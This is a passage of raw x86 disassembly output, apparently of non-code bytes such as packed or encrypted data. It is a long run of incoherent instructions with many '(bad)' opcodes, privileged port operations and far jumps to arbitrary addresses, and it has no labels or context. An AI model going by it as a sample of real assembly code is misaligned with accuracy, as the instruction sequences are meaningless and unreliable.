  40d1d2:	scas   al,BYTE PTR es:[edi]
  40d1d3:	pop    eax
  40d1d4:	call   0xc0ee:0xa4f0f50c
  40d1db:	sbb    BYTE PTR [eax-0x208e559c],bl
  40d1e1:	pop    edi
  40d1e2:	xchg   ebp,eax
  40d1e3:	fst    QWORD PTR [edi-0x38]
  40d1e6:	push   cs
  40d1e7:	sub    esi,DWORD PTR [esi]
  40d1e9:	ror    esi,cl
  40d1eb:	pop    ebp
  40d1ec:	mov    ah,0x16
  40d1ee:	xchg   edi,eax
  40d1ef:	mov    bh,0xe7
  40d1f1:	pop    edx
  40d1f2:	mov    bh,0x9c
  40d1f4:	bound  ecx,QWORD PTR [eax]
  40d1f6:	sub    eax,0xfb4626d1
  40d1fb:	cld    
  40d1fc:	retf   
  40d1fd:	dec    esi
  40d1fe:	(bad)  
  40d1ff:	cmp    al,0xe5
  40d201:	pop    ebx
  40d202:	arpl   WORD PTR [ebp-0x52],di
  40d205:	push   edi
  40d206:	jne    0x40d23c
  40d208:	ds mov cl,0xa1
  40d20b:	jp     0x40d216
  40d20d:	xchg   ebp,eax
  40d20e:	xchg   ebp,eax
  40d20f:	push   0xffffffd9
  40d211:	cld    
  40d212:	add    eax,0x54ba7c79
  40d217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d218:	xor    al,0xbf
  40d21a:	push   eax
  40d21b:	inc    eax
  40d21c:	addr16 and ebx,edi
  40d21f:	sete   BYTE PTR gs:[edx+0x6dacc5ae]
  40d227:	test   al,0x19
  40d229:	es or  eax,0x62607cc0
  40d22f:	ret    
  40d230:	pop    ebx
  40d231:	loopne 0x40d231
  40d233:	xor    eax,0x4e9bd21b
  40d238:	inc    ecx
  40d239:	add    al,0x55
  40d23b:	imul   BYTE PTR [ecx+0x5c]
  40d23e:	frstor [ebp-0x78f9d7df]
  40d244:	or     eax,0xff799828
  40d249:	cdq    
  40d24a:	bound  eax,QWORD PTR [esi+0x22]
  40d24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d24e:	pop    ss
  40d24f:	xor    BYTE PTR [ecx-0x38],al
  40d252:	ja     0x40d1ee
  40d254:	adc    BYTE PTR [ebx-0x13738f76],ah
  40d25a:	fist   DWORD PTR [ebp-0x357528cc]
  40d260:	jae    0x40d1e9
  40d262:	cdq    
  40d263:	lds    edx,FWORD PTR [ebp+0x6]
  40d266:	aam    0xcc
  40d268:	ja     0x40d257
  40d26a:	jo     0x40d20f
  40d26c:	fisub  DWORD PTR [ebx]
  40d26e:	inc    DWORD PTR [edx+0x3ea03881]
  40d274:	and    esp,DWORD PTR ds:0x8d5871fa
  40d27a:	test   DWORD PTR [ebp*2+0x649087c0],0xf6923768
  40d285:	or     bl,BYTE PTR [eax-0x41]
  40d288:	rcr    DWORD PTR [ecx+0x230857d9],0x60
  40d28f:	or     eax,0xf3d7137b
  40d294:	cs cmp al,0x90
  40d297:	stos   DWORD PTR es:[edi],eax
  40d298:	jecxz  0x40d309
  40d29a:	es popf 
  40d29c:	out    0xb1,eax
  40d29e:	call   0x39b9f688
  40d2a3:	in     al,0x14
  40d2a5:	aas    
  40d2a6:	ss jmp 0xcb0d684f
  40d2ac:	(bad)  
  40d2ad:	mov    ecx,0x547020b4
  40d2b2:	jb     0x40d2e8
  40d2b4:	(bad)  
  40d2b5:	and    DWORD PTR [ebx+0x52a09865],ebp
  40d2bb:	retf   0xa8f0
  40d2be:	cmp    DWORD PTR [edx-0x7],ebx
  40d2c1:	cld    
  40d2c2:	int    0xa0
  40d2c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2c5:	scas   al,BYTE PTR es:[edi]
  40d2c6:	sahf   
  40d2c7:	fcmovnu st,st(3)
  40d2c9:	pop    ecx
  40d2ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2cb:	dec    esp
  40d2cc:	mov    edx,0xaa2c8b33
  40d2d1:	sub    dl,BYTE PTR [edi-0x5b]
  40d2d4:	sub    BYTE PTR [eax-0x1c97cbd],al
  40d2da:	inc    ebx
  40d2db:	inc    edx
  40d2dc:	fwait
  40d2dd:	stc    
  40d2de:	test   eax,0x59c9614c
  40d2e3:	dec    ebp
  40d2e4:	stos   BYTE PTR es:[edi],al
  40d2e5:	mov    ecx,0x35380236
  40d2ea:	aad    0x6c
  40d2ec:	fidivr WORD PTR ds:0xaf1c12c3
  40d2f2:	sub    DWORD PTR [eax-0x24006ac8],edx
  40d2f8:	adc    DWORD PTR [ecx+0x29],0x582af23f
  40d2ff:	push   edi
  40d300:	pop    ebp
  40d301:	fisttp QWORD PTR [esi+0x5693b049]
  40d307:	pop    ss
  40d308:	jp     0x40d28e
  40d30a:	jmp    0x8c8b5b1d
  40d30f:	mov    BYTE PTR ds:0x2c56e958,dh
  40d315:	shl    bh,0x7e
  40d318:	fnstsw WORD PTR [edi]
  40d31a:	dec    dl
  40d31c:	jl     0x40d2af
  40d31e:	lds    eax,FWORD PTR [eax+0x16]
  40d321:	jge    0x40d311
  40d323:	sti    
  40d324:	inc    eax
  40d325:	jns    0x40d392
  40d327:	mov    dl,0x4a
  40d329:	out    dx,al
  40d32a:	into   
  40d32b:	rcl    edx,1
  40d32d:	adc    dl,dh
  40d32f:	sbb    al,0x92
  40d331:	bound  ebx,QWORD PTR [bx+si+0x1bab]
  40d336:	adc    eax,0x48463f77
  40d33b:	sub    eax,0x429739f9
  40d340:	lds    edi,FWORD PTR [edx]
  40d342:	mov    cl,0x2c
  40d344:	dec    edx
  40d345:	iret   
  40d346:	pop    edx
  40d347:	xor    bh,bl
  40d349:	fincstp 
  40d34b:	test   eax,0xf974d904
  40d350:	jle    0x40d33f
  40d352:	xchg   ebx,eax
  40d353:	fidivr WORD PTR [eax+0x21]
  40d356:	xchg   edx,eax
  40d357:	xchg   esi,eax
  40d358:	fcmove st,st(1)
  40d35a:	ds ret 
  40d35c:	sbb    cl,BYTE PTR [edi-0x1fdf3274]
  40d362:	xchg   edx,eax
  40d363:	cmp    al,BYTE PTR [esi+0x1491178d]
  40d369:	fisub  WORD PTR ds:0xd345ef02
  40d36f:	popf   
  40d370:	adc    ebp,esp
  40d372:	lods   al,BYTE PTR ds:[esi]
  40d373:	xor    al,0xb0
  40d375:	btr    DWORD PTR [eax+edi*8],ecx
  40d379:	fsub   QWORD PTR [ecx-0x57d8ca14]
  40d37f:	(bad)  
  40d380:	jns    0x40d38d
  40d382:	iret   
  40d383:	ds je  0x40d3d3
  40d386:	sti    
  40d387:	pop    eax
  40d388:	adc    ecx,0xcfb20782
  40d38e:	xchg   esp,eax
  40d38f:	xchg   cl,bl
  40d391:	add    esi,DWORD PTR [esi]
  40d393:	lock push ss
  40d395:	jg     0x40d378
  40d397:	pop    es
  40d398:	add    al,0x54
  40d39a:	pop    es
  40d39b:	mov    WORD PTR [edi-0x564d0990],gs
  40d3a1:	dec    ebx
  40d3a2:	mov    eax,ds:0xc1d652ce
  40d3a7:	sub    DWORD PTR [eax-0x5e6bb534],ebp
  40d3ad:	fmul   QWORD PTR [edi+0x7c638722]
  40d3b3:	and    DWORD PTR [ecx-0x42896a3],edi
  40d3b9:	and    BYTE PTR [eax],0x8a
  40d3bc:	xchg   edx,eax
  40d3bd:	mov    bl,0x5f
  40d3bf:	aad    0x34
  40d3c1:	mov    esp,0xb57d67be
  40d3c6:	jno    0x40d3e7
  40d3c8:	sub    DWORD PTR [ecx],edi
  40d3ca:	pop    edi
  40d3cb:	mov    al,0xd7
  40d3cd:	mov    edi,0xb7bc9e53
  40d3d2:	mov    edx,0x5ee80ff4
  40d3d7:	mov    dh,0x3f
  40d3d9:	mov    DWORD PTR [ecx-0x2a49fc89],ebx
  40d3df:	sar    DWORD PTR [ecx-0x3a],0x21
  40d3e3:	jmp    0x602ed4c3
  40d3e8:	das    
  40d3e9:	mov    ebx,0x794be851
  40d3ee:	int    0x2f
  40d3f0:	or     DWORD PTR [ecx+ebp*8-0x40],ebx
  40d3f4:	not    BYTE PTR [edx]
  40d3f6:	rol    edx,0x88
  40d3f9:	push   ds
  40d3fa:	mov    fs,WORD PTR [edi]
  40d3fc:	stos   BYTE PTR es:[edi],al
  40d3fd:	nop
  40d3fe:	and    BYTE PTR [eax+ebp*1+0x2f],0x3d
  40d403:	in     al,dx
  40d404:	jne    0x40d479
  40d406:	add    edi,DWORD PTR [edi]
  40d408:	psubd  mm1,QWORD PTR [ebx+0x0]
  40d40c:	lock dec ebp
  40d40e:	xchg   DWORD PTR [esi],ebp
  40d410:	push   es
  40d411:	xchg   dh,cl
  40d413:	rcl    DWORD PTR [ebx],cl
  40d415:	jecxz  0x40d3e0
  40d417:	rdpmc  
  40d419:	jns    0x40d3ad
  40d41b:	lds    edi,FWORD PTR [ebx-0xc1c331]
  40d421:	xor    ecx,esi
  40d423:	(bad)  
  40d424:	xchg   esp,eax
  40d425:	fisttp WORD PTR [eax]
  40d427:	mov    WORD PTR [edi+0x6],?
  40d42a:	cmp    al,0x83
  40d42c:	pusha  
  40d42d:	xchg   BYTE PTR [ecx],dh
  40d42f:	stos   BYTE PTR es:[edi],al
  40d430:	aad    0xe6
  40d432:	add    BYTE PTR [ecx+0x4fa2690b],ah
  40d438:	aaa    
  40d439:	in     eax,0x10
  40d43b:	das    
  40d43c:	mov    edi,0x2cbf1119
  40d441:	dec    esp
  40d442:	imul   ebp,ebx,0xfeb2ce25
  40d448:	xchg   edi,eax
  40d449:	aas    
  40d44a:	shl    esi,cl
  40d44c:	and    esi,DWORD PTR [ebx]
  40d44e:	adc    eax,0xd7930b94
  40d453:	mov    edi,0x7230169e
  40d458:	push   edx
  40d459:	ret    0x9e63
  40d45c:	and    BYTE PTR [ebx-0x75],bl
  40d45f:	sub    al,BYTE PTR [ecx]
  40d461:	mov    dh,0x77
  40d463:	cmp    edx,DWORD PTR [edi+0x7f]
  40d466:	xor    al,0x24
  40d468:	das    
  40d469:	jecxz  0x40d4df
  40d46b:	je     0x40d415
  40d46d:	mov    ebp,DWORD PTR [ebp+0xf]
  40d470:	add    bl,BYTE PTR [esi*8-0x6e2ce76e]
  40d477:	cld    
  40d478:	push   edi
  40d479:	fnstenv [ebp-0x2a67474c]
  40d47f:	xor    ch,BYTE PTR [ecx+0x17]
  40d482:	sar    BYTE PTR [ebx],1
  40d484:	jp     0x40d4e7
  40d486:	xor    DWORD PTR [esp+edx*2],ebp
  40d489:	add    edx,ebx
  40d48b:	push   cs
  40d48c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d48d:	mov    dl,0x52
  40d48f:	mov    eax,ds:0x951721d5
  40d494:	dec    esi
  40d495:	cmp    cl,BYTE PTR [ebx+0x5d65b4e4]
  40d49b:	not    BYTE PTR [edi]
  40d49d:	dec    esi
  40d49e:	mov    ds,WORD PTR [ebx-0x5d8f83fd]
  40d4a4:	and    DWORD PTR [edx],0x50
  40d4a7:	and    al,0x1
  40d4a9:	add    BYTE PTR [edi-0x1c5dfe64],dh
  40d4af:	inc    DWORD PTR [edx+0x9c574b6]
  40d4b5:	ds icebp 
  40d4b7:	mov    edi,0x9c5b25de
  40d4bc:	bound  ebp,QWORD PTR [ecx-0x48954c87]
  40d4c2:	cmp    DWORD PTR [esi],esi
  40d4c4:	in     al,0xae
  40d4c6:	rcl    BYTE PTR [esi],cl
  40d4c8:	pusha  
  40d4c9:	push   es
  40d4ca:	push   0xa37a2f0e
  40d4cf:	ds popf 
  40d4d1:	and    al,0xe2
  40d4d3:	pusha  
  40d4d4:	add    DWORD PTR fs:[eax-0x298465e1],0x9fcef12c
  40d4df:	cmp    al,al
  40d4e1:	cdq    
  40d4e2:	mov    al,0x6e
  40d4e4:	mov    ds:0xbf5a8e1f,eax
  40d4e9:	mov    bl,0x8
  40d4eb:	xor    edx,ecx
  40d4ed:	xchg   esi,eax
  40d4ee:	lea    eax,[edi-0x69]
  40d4f1:	dec    ebx
  40d4f2:	mov    al,ds:0x60b3b660
  40d4f7:	pop    edx
  40d4f8:	jge    0x40d47f
  40d4fa:	jmp    0xe61b310b
  40d4ff:	shl    DWORD PTR [edx-0x58],0xfb
  40d503:	or     al,cl
  40d505:	call   FWORD PTR [ebx+0x32279aee]
  40d50b:	pop    es
  40d50c:	out    0x8e,al
  40d50e:	ss je  0x40d4ee
  40d511:	push   edi
  40d512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d513:	jge    0x40d4e2
  40d515:	in     eax,dx
  40d516:	das    
  40d517:	clc    
  40d518:	lds    eax,FWORD PTR [esi+0x57]
  40d51b:	mov    bh,0x38
  40d51d:	imul   ebp,DWORD PTR ds:0xb78a0d8b,0x34086a3b
  40d527:	test   eax,0x98691d4
  40d52c:	shl    edx,0xac
  40d52f:	stos   DWORD PTR es:[edi],eax
  40d530:	pop    ds
  40d531:	add    DWORD PTR ds:[ecx],esp
  40d534:	ins    DWORD PTR es:[edi],dx
  40d535:	es in  al,dx
  40d537:	jae    0x40d504
  40d539:	push   0x69
  40d53b:	xchg   edx,eax
  40d53c:	imul   esp,DWORD PTR [edx],0xd50099a0
  40d542:	bound  esp,QWORD PTR [ebx]
  40d544:	adc    ebx,DWORD PTR [edx+0x48]
  40d547:	dec    esp
  40d548:	shr    ah,1
  40d54a:	out    0xc7,eax
  40d54c:	aam    0xb4
  40d54e:	xchg   ebp,eax
  40d54f:	push   eax
  40d550:	mov    esi,esp
  40d552:	dec    esi
  40d553:	inc    ecx
  40d554:	hlt    
  40d555:	iret   
  40d556:	cwde   
  40d557:	xlat   BYTE PTR ds:[ebx]
  40d558:	mov    dl,0x11
  40d55a:	outs   dx,BYTE PTR ds:[esi]
  40d55b:	gs xor eax,0x67bc5226
  40d561:	mov    dh,0x67
  40d563:	and    al,0x3
  40d565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d566:	jb     0x40d5c7
  40d568:	iret   
  40d569:	or     bh,BYTE PTR [ebx-0x3c8bf5f]
  40d56f:	mov    bh,0xf3
  40d571:	pop    ebx
  40d572:	sub    al,0xa1
  40d574:	mov    edx,esp
  40d576:	(bad)  
  40d577:	dec    edi
  40d578:	adc    bx,WORD PTR [ebx+0x3ae1f6cb]
  40d57f:	in     al,0xb0
  40d581:	sub    al,al
  40d583:	nop
  40d584:	sub    al,0x5c
  40d586:	jns    0x40d55e
  40d588:	mov    ch,0x34
  40d58a:	xchg   edi,eax
  40d58b:	xchg   ebx,eax
  40d58c:	add    dl,BYTE PTR [esi]
  40d58e:	pop    ecx
  40d58f:	int    0x34
  40d591:	imul   ecx,eax,0x8d75b979
  40d597:	or     BYTE PTR [ecx-0x5c497d13],bl
  40d59d:	retf   
  40d59e:	or     al,0xc4
  40d5a0:	mov    bh,al
  40d5a2:	push   ds
  40d5a3:	or     ebp,edi
  40d5a5:	jmp    0x2320769
  40d5aa:	xchg   esp,eax
  40d5ab:	js     0x40d5ef
  40d5ad:	(bad)  
  40d5ae:	xchg   esi,eax
  40d5af:	or     DWORD PTR [edi],ecx
  40d5b1:	pop    ds
  40d5b2:	push   0x3dbc0711
  40d5b7:	push   ds
  40d5b8:	mov    bl,0x66
  40d5ba:	ret    0x6fd
  40d5bd:	dec    esi
  40d5be:	jge    0x40d608
  40d5c0:	imul   eax,ebp,0xffffffb1
  40d5c3:	xchg   ebx,eax
  40d5c4:	nop
  40d5c5:	(bad)  
  40d5c6:	jno    0x40d626
  40d5c8:	jae    0x40d5bb
  40d5ca:	mov    dl,0x50
  40d5cc:	scas   eax,DWORD PTR es:[edi]
  40d5cd:	iret   
  40d5ce:	mov    dl,0xfb
  40d5d0:	inc    edx
  40d5d1:	inc    edx
  40d5d2:	retf   
  40d5d3:	adc    eax,0x99d98cda
  40d5d8:	test   dl,ch
  40d5da:	and    edi,DWORD PTR [esi+0x63]
  40d5dd:	ins    BYTE PTR es:[edi],dx
  40d5de:	je     0x40d581
  40d5e0:	retf   0xfd3b
  40d5e3:	(bad)  
  40d5e5:	dec    esi
  40d5e6:	rcl    BYTE PTR [ebx+0x6edba7f2],0x8b
  40d5ed:	in     eax,dx
  40d5ee:	in     al,0xf
  40d5f0:	test   DWORD PTR ds:0xd5890bf7,esi
  40d5f6:	inc    edx
  40d5f7:	fist   DWORD PTR [eax+0x3c]
  40d5fa:	dec    DWORD PTR ds:0x3c96cb38
  40d600:	jge    0x40d61e
  40d602:	xchg   edx,eax
  40d603:	pop    es
  40d604:	fs cmp cl,ah
  40d607:	imul   dl
  40d609:	loop   0x40d622
  40d60b:	and    bl,BYTE PTR [edx]
  40d60d:	fidivr DWORD PTR [esi-0x24]
  40d610:	push   0xfffffff2
  40d612:	(bad)  
  40d613:	aam    0x2c
  40d615:	sbb    DWORD PTR [ebp-0x1f82da8f],esi
  40d61b:	or     cl,0xa1
  40d61e:	xor    al,0x26
  40d620:	popa   
  40d621:	mov    ds:0x570219eb,eax
  40d626:	pusha  
  40d627:	stos   BYTE PTR es:[edi],al
  40d628:	lahf   
  40d629:	fs inc esi
  40d62b:	iret   
  40d62c:	out    0x60,eax
  40d62e:	test   ch,0xa5
  40d631:	or     BYTE PTR [eax+esi*4],0xf2
  40d635:	ins    BYTE PTR es:[edi],dx
  40d636:	inc    ebp
  40d637:	lods   al,BYTE PTR ds:[esi]
  40d638:	ss mov eax,0x571199d3
  40d63e:	gs in  al,dx
  40d640:	inc    ebx
  40d641:	int3   
  40d642:	sahf   
  40d643:	jl     0x40d67f
  40d645:	sbb    eax,0x44b0db6c
  40d64a:	not    DWORD PTR [esi-0x3fdeff38]
  40d650:	push   esp
  40d651:	cmp    BYTE PTR [edx-0x38],cl
  40d654:	and    edi,eax
  40d656:	lahf   
  40d657:	aad    0x40
  40d659:	and    al,0x6c
  40d65b:	ss xchg ecx,eax
  40d65d:	mov    ch,0xb2
  40d65f:	ja     0x40d6b7
  40d661:	xlat   BYTE PTR ds:[ebx]
  40d662:	mov    ds:0x7acd0fdb,eax
  40d667:	daa    
  40d668:	dec    ebx
  40d669:	aad    0xe0
  40d66b:	or     BYTE PTR [ebx+0x241a445f],bh
  40d671:	ret    
  40d672:	and    eax,DWORD PTR [esi+0x3d]
  40d675:	add    DWORD PTR [esi-0x63],ecx
  40d678:	in     al,dx
  40d679:	inc    ebx
  40d67a:	inc    ebp
  40d67b:	jge    0x40d6ad
  40d67d:	xor    al,0x46
  40d67f:	out    0x2f,al
  40d681:	push   eax
  40d682:	cmp    al,0x96
  40d684:	mov    cs,WORD PTR [ecx-0x94f0fb8]
  40d68a:	dec    ecx
  40d68b:	lock push esi
  40d68d:	add    dl,ah
  40d68f:	or     eax,0x5fdf770
  40d694:	mov    edx,0x856bf6b0
  40d699:	test   BYTE PTR [ecx-0x2d94b7bd],cl
  40d69f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6a1:	pop    es
  40d6a2:	and    BYTE PTR [edi],bl
  40d6a4:	jns    0x40d63f
  40d6a6:	sbb    DWORD PTR ds:0x9ab4de8,eax
  40d6ac:	(bad)  
  40d6ad:	clc    
  40d6ae:	adc    DWORD PTR [edx-0x29],0xb
  40d6b2:	pushf  
  40d6b3:	sbb    ah,BYTE PTR [edx-0x28c863f1]
  40d6b9:	push   cs
  40d6ba:	jg     0x40d717
  40d6bc:	scas   al,BYTE PTR es:[edi]
  40d6bd:	mov    edx,0x7a195fb0
  40d6c2:	jmp    0x77bf00ea
  40d6c7:	sti    
  40d6c8:	shl    edx,cl
  40d6ca:	mov    cl,0x6f
  40d6cc:	inc    ebx
  40d6cd:	sbb    eax,0xedb7ee96
  40d6d2:	jmp    FWORD PTR [ebx+0x51b2b8f9]
  40d6d8:	dec    di
  40d6da:	xchg   DWORD PTR [edi-0x7d7d3c50],esi
  40d6e0:	push   0xd1765153
  40d6e5:	push   esp
  40d6e6:	(bad)  
  40d6e7:	mov    ah,0xa4
  40d6e9:	add    esp,DWORD PTR [eax-0x15]
  40d6ec:	icebp  
  40d6ed:	scas   eax,DWORD PTR es:[edi]
  40d6ee:	dec    eax
  40d6ef:	push   ds
  40d6f0:	add    DWORD PTR [edx+ecx*2+0x6b1d062],ebp
  40d6f7:	jno    0x40d6ed
  40d6f9:	cmp    eax,0xa980a2d7
  40d6fe:	cmp    BYTE PTR [eax+0x38aafdcc],dl
  40d704:	fcom   QWORD PTR [eax-0x36]
  40d707:	inc    esp
  40d708:	repz jae 0x40d711
  40d70b:	add    esp,DWORD PTR [edx]
  40d70d:	nop
  40d70e:	or     ah,BYTE PTR ds:0x1d33b45d
  40d714:	jmp    0x40d72a
  40d716:	sbb    ebx,ebp
  40d718:	xor    BYTE PTR [eax],dl
  40d71a:	jmp    0x40d795
  40d71c:	sub    ebp,eax
  40d71e:	mov    al,bh
  40d720:	mov    eax,ds:0xc4809558
  40d725:	xchg   BYTE PTR [ebp-0x11ab6e3],bh
  40d72b:	xor    al,0xa
  40d72d:	add    al,0x2b
  40d72f:	mov    WORD PTR [eax-0x6f],fs
  40d732:	(bad)  
  40d733:	mov    bh,0xea
  40d735:	movzx  eax,di
  40d738:	mov    eax,ds:0x26fe3b5c
  40d73d:	mov    ch,0x65
  40d73f:	(bad)  
  40d740:	repz cli 
  40d742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d743:	push   ebx
  40d744:	xor    esi,DWORD PTR [eax+0x43bffc37]
  40d74a:	shl    BYTE PTR [ebx+0x67],1
  40d74d:	xchg   esp,eax
  40d74e:	xor    DWORD PTR [ebx-0x3345eda4],esi
  40d754:	jmp    0x50c4da28
  40d759:	popf   
  40d75a:	jae    0x40d7a1
  40d75c:	hlt    
  40d75d:	arpl   ax,di
  40d75f:	xor    eax,0x66ab5024
  40d764:	jo     0x40d732
  40d766:	cwde   
  40d767:	xchg   DWORD PTR ds:0x135c1429,edx
  40d76d:	cs or  eax,0xe12f8e0b
  40d774:	jbe    0x40d703
  40d776:	sbb    eax,0x151a2eb4
  40d77b:	cmc    
  40d77c:	sahf   
  40d77d:	xor    bh,BYTE PTR [edx-0x36]
  40d780:	pop    esp
  40d781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d782:	imul   BYTE PTR [esi+0x4548c913]
  40d788:	pop    edx
  40d789:	xor    BYTE PTR ds:0x2f9b024,dh
  40d78f:	ins    DWORD PTR es:[edi],dx
  40d790:	push   esi
  40d791:	cdq    
  40d792:	in     al,0xca
  40d794:	shl    DWORD PTR [ebp-0x22],1
  40d797:	xchg   esp,eax
  40d798:	lock mov bl,0x8f
  40d79b:	pop    esp
  40d79c:	or     cl,BYTE PTR [edi+0x70e4df70]
  40d7a2:	je     0x40d743
  40d7a4:	fstp   TBYTE PTR [ebx+0x6a]
  40d7a7:	push   esi
  40d7a8:	scas   eax,DWORD PTR es:[edi]
  40d7a9:	aam    0xa7
  40d7ab:	push   0xffffff84
  40d7ad:	sub    bh,ah
  40d7af:	nop
  40d7b0:	stos   DWORD PTR es:[edi],eax
  40d7b1:	push   ss
  40d7b2:	cli    
  40d7b3:	aad    0xb1
  40d7b5:	cmc    
  40d7b6:	lods   al,BYTE PTR ds:[esi]
  40d7b7:	outs   dx,BYTE PTR ds:[esi]
  40d7b8:	push   0x4d
  40d7ba:	ins    DWORD PTR es:[edi],dx
  40d7bb:	pushf  
  40d7bc:	mov    ds:0xdc1e7770,eax
  40d7c1:	jmp    0xb48a:0xa67224d2
  40d7c8:	pop    eax
  40d7c9:	(bad)  
  40d7ca:	shl    BYTE PTR [edi+0x72],1
  40d7cd:	sub    BYTE PTR [edx+edx*4-0x77889389],dh
  40d7d4:	pop    ss
  40d7d5:	pop    esp
  40d7d6:	jnp    0x40d82e
  40d7d8:	in     al,0xbe
  40d7da:	mov    cl,0x3a
  40d7dc:	jg     0x40d7e0
  40d7de:	jl     0x40d7bb
  40d7e0:	jne    0x40d85f
  40d7e2:	add    bl,dl
  40d7e4:	ja     0x40d7bf
  40d7e6:	adc    BYTE PTR [edx+eax*4+0x51],dl
  40d7ea:	ins    DWORD PTR es:[edi],dx
  40d7eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7ec:	ficomp DWORD PTR [ebp+eiz*1-0x27cc1520]
  40d7f3:	inc    DWORD PTR [ebp-0x30]
  40d7f6:	xlat   BYTE PTR ds:[ebx]
  40d7f7:	ss ja  0x40d860
  40d7fa:	cmp    BYTE PTR [ebp-0x68d5235],0xbd
  40d801:	jne    0x40d836
  40d803:	push   esi
  40d804:	dec    ecx
  40d805:	shr    BYTE PTR [ecx+0x77182fc],1
  40d80b:	jnp    0x40d80e
  40d80d:	inc    edi
  40d80e:	push   ds
  40d80f:	cmp    BYTE PTR [edi],bl
  40d811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d812:	addr16 push esp
  40d814:	lea    edi,[edx-0x6eee81ee]
  40d81a:	lea    esp,[edi-0x10]
  40d81d:	fcom   QWORD PTR [ecx]
  40d81f:	push   0x3
  40d821:	push   cs
  40d822:	and    bl,BYTE PTR [ebp-0x1108cc91]
  40d828:	pop    ebx
  40d829:	addr16 push ss
  40d82b:	in     al,0xdc
  40d82d:	(bad)  
  40d82e:	jmp    0x843676b7
  40d833:	fisubr WORD PTR [ebx]
  40d835:	pusha  
  40d836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d837:	enter  0xfe1c,0x49
  40d83b:	sub    BYTE PTR [esi+0xd14d9be],cl
  40d841:	out    0xb1,al
  40d843:	adc    DWORD PTR [esi+0x3b],esi
  40d846:	in     eax,0x34
  40d848:	jo     0x40d82c
  40d84a:	in     eax,dx
  40d84b:	sbb    BYTE PTR [esp+edx*4-0x26fc7821],al
  40d852:	ja     0x40d7e6
  40d854:	push   esp
  40d855:	xlat   BYTE PTR ds:[ebx]
  40d856:	aam    0x3e
  40d858:	jns    0x40d804
  40d85a:	retf   0x3c4
  40d85d:	pusha  
  40d85e:	sub    cl,BYTE PTR [ecx-0xb057665]
  40d864:	lods   eax,DWORD PTR ds:[esi]
  40d865:	loop   0x40d8d5
  40d867:	gs es ss mov cl,ch
  40d86c:	mov    ds:0xe7615300,eax
  40d871:	arpl   WORD PTR [eax-0x40fc3457],di
  40d877:	push   ss
  40d878:	inc    edx
  40d879:	sub    BYTE PTR [ebx],0x97
  40d87c:	(bad)  
  40d87d:	or     eax,0xd01d4b62
  40d882:	stc    
  40d883:	xchg   esi,eax
  40d884:	jns    0x40d871
  40d886:	loope  0x40d84a
  40d888:	jns    0x40d84b
  40d88a:	daa    
  40d88b:	xchg   esp,esp
  40d88d:	mov    ebx,0x67ea3d0
  40d892:	or     al,0x62
  40d894:	push   edi
  40d895:	mov    al,0x62
  40d897:	sub    eax,0xf3156df9
  40d89c:	xchg   ebp,eax
  40d89d:	cmp    al,0xd8
  40d89f:	and    esi,DWORD PTR gs:[eax+0x7c]
  40d8a3:	test   eax,0x8407dc92
  40d8a8:	repz inc eax
  40d8aa:	dec    ebp
  40d8ab:	or     edi,DWORD PTR [edx]
  40d8ad:	xor    eax,0x57966c02
  40d8b2:	in     al,dx
  40d8b3:	jmp    0x40d933
  40d8b5:	mov    ebx,0x33314e50
  40d8ba:	test   al,0x43
  40d8bc:	shr    ch,0xe0
  40d8bf:	cmp    DWORD PTR [esp+esi*4-0x4c691adb],esi
  40d8c6:	popa   
  40d8c7:	and    eax,0xe7661f27
  40d8cc:	stc    
  40d8cd:	mov    eax,ds:0x6bf6c8f2
  40d8d2:	shl    ebx,cl
  40d8d4:	xor    al,0x46
  40d8d6:	or     DWORD PTR [eax-0x40b2b4a],ebp
  40d8dc:	adc    bl,BYTE PTR [ebx]
  40d8de:	and    eax,0x6dce5cab
  40d8e3:	mov    eax,ds:0xa84ecf64
  40d8e8:	or     BYTE PTR [esi-0x7e],cl
  40d8eb:	xor    esp,DWORD PTR [edx-0x74]
  40d8ee:	cmp    edi,DWORD PTR [edx+0x6c]
  40d8f1:	into   
  40d8f2:	sub    ebp,eax
  40d8f4:	xor    bl,bl
  40d8f6:	adc    al,0x8f
  40d8f8:	cmp    dl,BYTE PTR gs:[edx]
  40d8fb:	jmp    0x33a61683
  40d900:	into   
  40d901:	call   0x320f:0x33564e0b
  40d908:	lea    edx,[edx-0x25]
  40d90b:	sahf   
  40d90c:	clc    
  40d90d:	mov    eax,ds:0x1255b4fd
  40d912:	jo     0x40d8dc
  40d914:	rcl    DWORD PTR ds:0x9b152b07,0xd6
  40d91b:	jmp    0x3a5d:0x35faae76
  40d922:	sbb    eax,0xf5e4032a
  40d927:	dec    edi
  40d928:	fcmovne st,st(6)
  40d92a:	and    al,0x7b
  40d92c:	sti    
  40d92d:	shl    BYTE PTR [edx-0x47],1
  40d930:	imul   BYTE PTR [edi-0x2]
  40d933:	sub    ebx,DWORD PTR ds:0xb779eb63
  40d939:	xchg   ebp,eax
  40d93a:	ror    DWORD PTR [esi-0x1df836c1],0xc2
  40d941:	dec    edi
  40d942:	fcomp  QWORD PTR [ecx]
  40d944:	retf   0x5cf1
  40d947:	pop    eax
  40d948:	imul   ebx,eax,0x770c3943
  40d94e:	fucomi st,st(7)
  40d950:	aas    
  40d951:	mov    dh,0xef
  40d953:	adc    BYTE PTR [ebx+0x311b2ab3],0x0
  40d95a:	push   ebp
  40d95b:	aaa    
  40d95c:	test   DWORD PTR [ecx+esi*8+0x73b697a6],edx
  40d963:	test   BYTE PTR [ecx],al
  40d965:	test   bl,bh
  40d967:	push   dx
  40d969:	sub    al,0x21
  40d96b:	jns    0x40d946
  40d96d:	mov    edx,0x88aaaafe
  40d972:	jmp    0x40d941
  40d974:	popf   
  40d975:	sub    dl,BYTE PTR gs:[edi-0x369b63aa]
  40d97c:	(bad)  
  40d97d:	fst    QWORD PTR [ebp-0x42d93292]
  40d983:	shr    ch,cl
